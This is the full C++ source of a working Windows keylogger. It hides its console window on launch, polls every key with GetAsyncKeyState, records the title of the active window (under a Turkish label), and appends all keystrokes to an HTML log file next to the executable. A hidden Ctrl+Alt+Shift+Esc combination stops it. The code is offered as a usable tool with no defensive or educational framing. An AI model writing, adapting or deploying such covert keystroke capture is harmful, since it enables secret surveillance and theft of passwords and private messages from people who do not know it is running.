#define _WIN32_WINNT 0x0500
#include <cstdlib>
#include <iostream>
#include <process.h>
#include <windows.h>
#include <fstream>
#include <string>

using namespace std;

ofstream fout;
char file1[1024]; 
void log(const string & str);
void get_active_window_name(void*par);
bool log_wname=false;
bool end_wname=false;
string cur_wname="";

int main(int argc, char *argv[])
{
    
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );
    
    const int fplen=1024;
    char fullpath[fplen];
    GetFullPathName(argv[0],fplen,fullpath,0);
   

    int length=strlen(fullpath);
    char replacement[]="logs.html";
    int i;
    for (i=length-1; fullpath[i]!='\\'; i--);
    strcpy(fullpath+i+1,replacement);
    strcpy(file1,fullpath);
    
    UINT cur_key;
    BYTE key_state[256];
    bool is_pressed;
    bool print;
    WORD ascii[2];
    char cur_char;
    bool quit=false;
    bool shift;
    bool ctrl;
    bool alt;
    bool esc;
    string output;
    
    const unsigned int delay=25;
    const unsigned int no_print_time=500;
    unsigned int time_pressed[256];
    for (cur_key=0; cur_key<256; cur_key++) time_pressed[cur_key]=0;
    
    _beginthread(get_active_window_name,0,0);
    
    while (!quit)
    {
          shift=GetAsyncKeyState(VK_SHIFT);
          ctrl=GetAsyncKeyState(VK_CONTROL);
          alt=GetAsyncKeyState(VK_MENU);
          esc=GetAsyncKeyState(VK_ESCAPE);
          if (shift&&ctrl&&alt&&esc) {quit=true; continue;}
          //quit with ctrl+alt+shift+esc :D
          
          GetKeyboardState(key_state);
          for (cur_key=0; cur_key<256; cur_key++)
          {
              output="";
              
              is_pressed=GetAsyncKeyState(cur_key);
              if (!is_pressed) {time_pressed[cur_key]=0; continue;}
              time_pressed[cur_key]+=delay;
              
              shift=GetAsyncKeyState(VK_SHIFT);
              ctrl=GetAsyncKeyState(VK_CONTROL);
              alt=GetAsyncKeyState(VK_MENU);
              
              if (ctrl) output+="<i>[CTRL]</i>";
              if (alt) output+="<i>[ALT]</i>";
              if (shift) output+="<i>[SHIFT]</i>";
              print=false;
              switch (cur_key)
              {
                     case VK_BACK: output+="(backspace)"; print=true; break;
                     case VK_CAPITAL: output+="(caps lock)"; print=true; break;
                     case VK_ESCAPE: output+="(esc)"; print=true; break;
              }
              
              if (time_pressed[cur_key]>delay && time_pressed[cur_key]<=no_print_time) print=false;
              if (print) {log(output); continue;}
              print=(ToAscii(cur_key,0,key_state,ascii,0)>0);
              if (time_pressed[cur_key]>delay && time_pressed[cur_key]<=no_print_time) print=false;
              if (!print) continue;
              
              cur_char=char(ascii[0]&255);             
              if (isspace(cur_char)) cur_char=' ';
              output+=cur_char;
              
              log(output);     
          }
          Sleep(delay);
    }
    end_wname=true;
    return 0;
}

void log(const string & str)
{
     string temp="";
     if (log_wname) 
     {
        temp="<br /><br /><b><font color='red'>Aktif Pencere:</font>\""+cur_wname+"\")</b><br />";
        log_wname=false;
     }
     temp+=str;
     
     fout.open(file1,ios::app);
     if (fout.is_open()) fout << temp;
     fout.close();
}

void get_active_window_name(void*par)
{
    HWND window;
    HANDLE process;
    char name[256];
    
    while (!end_wname)
    {    
         Sleep(500);
         window=GetForegroundWindow();
         GetWindowText(window,name,256);
    
         if (cur_wname!=name) log_wname=true;
         cur_wname=name;
    }
    
    _endthread();
}